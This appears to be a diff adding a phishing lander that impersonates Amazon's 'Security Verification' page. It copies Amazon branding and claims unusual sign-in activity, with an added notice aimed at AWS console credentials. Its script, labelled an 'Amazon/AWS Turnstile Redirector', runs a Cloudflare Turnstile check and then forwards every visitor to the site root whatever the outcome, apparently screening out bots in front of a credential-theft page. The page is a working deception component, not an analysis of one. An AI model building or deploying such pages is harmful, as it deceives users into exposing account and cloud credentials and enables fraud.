@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Verification - Amazon</title>
+    <link rel="icon" href="https://www.amazon.com/favicon.ico" type="image/x-icon">
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: "Amazon Ember", Arial, sans-serif;
+            background: #eaeded;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            color: #0f1111;
+        }
+
+        .container {
+            background: white;
+            padding: 40px 32px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            text-align: center;
+            max-width: 460px;
+            width: 100%;
+        }
+
+        .amazon-logo {
+            width: 120px;
+            margin-bottom: 28px;
+        }
+
+        h1 {
+            font-size: 28px;
+            font-weight: 400;
+            margin-bottom: 12px;
+            color: #0f1111;
+        }
+
+        .subtitle {
+            font-size: 15px;
+            color: #565959;
+            margin-bottom: 28px;
+            line-height: 22px;
+        }
+
+        .security-info {
+            background: #f7f8f8;
+            border: 1px solid #d5d9d9;
+            padding: 18px;
+            margin-bottom: 24px;
+            text-align: left;
+            border-radius: 8px;
+        }
+
+        .security-info h2 {
+            font-size: 15px;
+            font-weight: 700;
+            margin-bottom: 10px;
+            color: #0f1111;
+        }
+
+        .security-info p {
+            font-size: 14px;
+            color: #565959;
+            line-height: 20px;
+            margin: 0;
+        }
+
+        .loading-container {
+            margin: 28px 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+        }
+
+        .spinner {
+            width: 32px;
+            height: 32px;
+            border: 3px solid #e7e7e7;
+            border-top-color: #ff9900;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .status-text {
+            font-size: 14px;
+            color: #565959;
+        }
+
+        .aws-notice {
+            background: #f0f8ff;
+            border-left: 3px solid #ff9900;
+            padding: 12px 16px;
+            margin-top: 20px;
+            text-align: left;
+            border-radius: 4px;
+            font-size: 13px;
+            color: #0f1111;
+        }
+
+        .footer {
+            margin-top: 28px;
+            padding-top: 20px;
+            border-top: 1px solid #e7e7e7;
+            font-size: 12px;
+            color: #565959;
+        }
+
+        .footer a {
+            color: #007185;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            color: #c7511f;
+            text-decoration: underline;
+        }
+
+        #cf-turnstile {
+            display: none;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                margin: 16px;
+                padding: 28px 20px;
+            }
+            
+            h1 {
+                font-size: 24px;
+            }
+            
+            .subtitle {
+                font-size: 14px;
+            }
+        }
+    </style>
+    
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit"></script>
+</head>
+<body>
+    <div class="container">
+        <!-- Amazon Logo -->
+        <svg class="amazon-logo" viewBox="0 0 120 38" xmlns="http://www.w3.org/2000/svg">
+            <g fill="none" fill-rule="evenodd">
+                <path d="M73.5 25.8c-7.3 5.4-17.9 8.3-27.1 8.3-12.8 0-24.3-4.7-33-12.6-.7-.6-.1-1.5.7-1 10.6 6.2 23.7 9.9 37.2 9.9 9.1 0 19.2-1.9 28.4-5.8 1.4-.6 2.6.9 1.3 1.9l-7.5.3z" fill="#FF9900"/>
+                <path d="M76.8 22c-.9-1.2-6.2-.6-8.6-.3-.7.1-.8-.5-.2-1 4.2-3 11.1-2.1 11.9-1.1.8 1-.2 8-4.2 11.3-.6.5-1.2.2-.9-.4.9-2.2 2.9-7.1 2-8.5z" fill="#FF9900"/>
+                <path d="M68.4 5.8V3.5c0-.4.3-.6.6-.6h11.1c.4 0 .6.3.6.6v2c0 .3-.3.8-.9 1.5l-5.8 8.2c2.1-.1 4.4.3 6.3 1.4.4.2.5.6.6 1v2.4c0 .4-.4.8-.8.6-3.4-1.8-7.9-2-11.7.1-.4.2-.8-.2-.8-.6v-2.3c0-.4 0-1.1.4-1.7l6.7-9.6h-5.8c-.3 0-.5-.3-.5-.7zM25.5 21.3h-3.1c-.3 0-.5-.2-.6-.5V3.6c0-.3.3-.6.6-.6h2.9c.3 0 .5.2.6.5v2.2h.1c.8-2.1 2.3-3.1 4.3-3.1 2.1 0 3.4 1 4.3 3.1.8-2.1 2.8-3.1 4.5-3.1 1.4 0 2.9.6 3.8 1.8.9 1.4 1.4 3.3 1.4 5.2v11.1c0 .3-.3.6-.6.6h-3.1c-.3 0-.6-.2-.6-.6v-9.3c0-1.1 0-2.9-.4-3.9-.3-1.1-1-1.6-2.1-1.6-.9 0-1.8.6-2.2 1.5-.4.9-.4 2.5-.4 3.9v9.3c0 .3-.3.6-.6.6h-3.1c-.3 0-.6-.2-.6-.6l-.1-9.3c0-2-.3-4.9-2.1-4.9-1.8 0-1.8 2.9-1.8 4.9v9.3c-.2.4-.4.6-.7.6zM88.3 2.6c4.6 0 7.1 4 7.1 9 0 4.9-2.8 8.7-7.1 8.7-4.5 0-7-4-7-8.9 0-4.9 2.5-8.8 7-8.8zm0 3.2c-2.3 0-2.4 3.1-2.4 5-.1 1.9 0 6 2.4 6 2.3 0 2.5-3.2 2.5-5.2 0-1.3-.1-2.9-.5-4.2-.3-1.1-.8-1.7-1.9-1.7l-.1.1zm12.6 15.5h-3.1c-.3 0-.6-.2-.6-.6V3.6c0-.3.3-.6.6-.6H101c.3 0 .5.2.6.5v2.5h.1c1-2.3 2.4-3.4 4.8-3.4 1.6 0 3.1.6 4.1 2.1.9 1.4 1 3.8 1 5.5v11c0 .3-.3.6-.6.6h-3.1c-.3 0-.5-.2-.6-.5V10c0-2.3.3-5.6-2.5-5.6-.9 0-1.8.6-2.2 1.5-.5 1.2-.6 2.3-.6 3.6v11.2c-.1.4-.4.6-.7.6z" fill="#0F1111"/>
+            </g>
+        </svg>
+        
+        <h1>Security Verification</h1>
+        
+        <div class="subtitle">
+            Additional verification required to protect your account
+        </div>
+        
+        <div class="security-info">
+            <h2>Account Protection</h2>
+            <p>We noticed unusual activity or a sign-in attempt from a new location or device. This verification helps keep your Amazon account and payment methods secure.</p>
+        </div>
+        
+        <div class="loading-container">
+            <div class="spinner"></div>
+            <div class="status-text" id="status-text">Verifying your request...</div>
+        </div>
+        
+        <div id="cf-turnstile"></div>
+        
+        <div class="aws-notice">
+            <strong>AWS Console Access:</strong> This verification also applies to AWS console sign-in attempts and protects your cloud infrastructure credentials.
+        </div>
+        
+        <div class="footer">
+            <a href="https://www.amazon.com/gp/help/customer/display.html?nodeId=468496" target="_blank">Conditions of Use</a> • 
+            <a href="https://www.amazon.com/gp/help/customer/display.html?nodeId=468496" target="_blank">Privacy Notice</a> • 
+            <a href="https://www.amazon.com/gp/help/customer/display.html" target="_blank">Help</a>
+        </div>
+    </div>
+
+    <script>
+        const TURNSTILE_SITEKEY = '0x4AAAAAAB_V5zjG-p6Hl2ZQ';
+        let REDIRECT_URL = window.location.protocol + "//" + window.location.host + "/";
+        
+        console.log('Amazon/AWS Turnstile Redirector - Redirect URL:', REDIRECT_URL);
+        
+        function performRedirect() {
+            console.log('Performing redirect to:', REDIRECT_URL);
+            window.location.href = REDIRECT_URL;
+        }
+        
+        if (typeof turnstile === 'undefined') {
+            console.error('Turnstile failed to load. Redirecting anyway...');
+            document.querySelector('.status-text').textContent = 'Completing verification...';
+            setTimeout(performRedirect, 2000);
+        } else {
+            turnstile.ready(function () {
+                let verificationTimeout;
+                let verificationCompleted = false;
+                
+                verificationTimeout = setTimeout(function() {
+                    if (!verificationCompleted) {
+                        console.warn('Turnstile verification timeout - redirecting anyway');
+                        document.querySelector('.status-text').textContent = 'Completing verification...';
+                        setTimeout(performRedirect, 500);
+                    }
+                }, 5000);
+                
+                try {
+                    turnstile.render('#cf-turnstile', {
+                        sitekey: TURNSTILE_SITEKEY,
+                        callback: function(token) {
+                            verificationCompleted = true;
+                            clearTimeout(verificationTimeout);
+                            document.querySelector('.status-text').textContent = 'Verification complete. Redirecting...';
+                            setTimeout(performRedirect, 800);
+                        },
+                        'error-callback': function(error) {
+                            verificationCompleted = true;
+                            clearTimeout(verificationTimeout);
+                            console.error('Turnstile error:', error);
+                            document.querySelector('.status-text').textContent = 'Bypassing verification...';
+                            setTimeout(performRedirect, 1000);
+                        },
+                        'timeout-callback': function() {
+                            console.warn('Turnstile timeout');
+                            document.querySelector('.status-text').textContent = 'Verification timeout. Redirecting...';
+                            setTimeout(performRedirect, 1000);
+                        }
+                    });
+                } catch (e) {
+                    clearTimeout(verificationTimeout);
+                    console.error('Failed to render Turnstile:', e);
+                    setTimeout(performRedirect, 1500);
+                }
+            });
+        }
+        
+        setTimeout(function() {
+            if (REDIRECT_URL) {
+                console.log('3-second fallback redirect triggered');
+                document.querySelector('.status-text').textContent = 'Verification complete. Redirecting...';
+                performRedirect();
+            }
+        }, 3000);
+    </script>
+</body>
+</html>
+
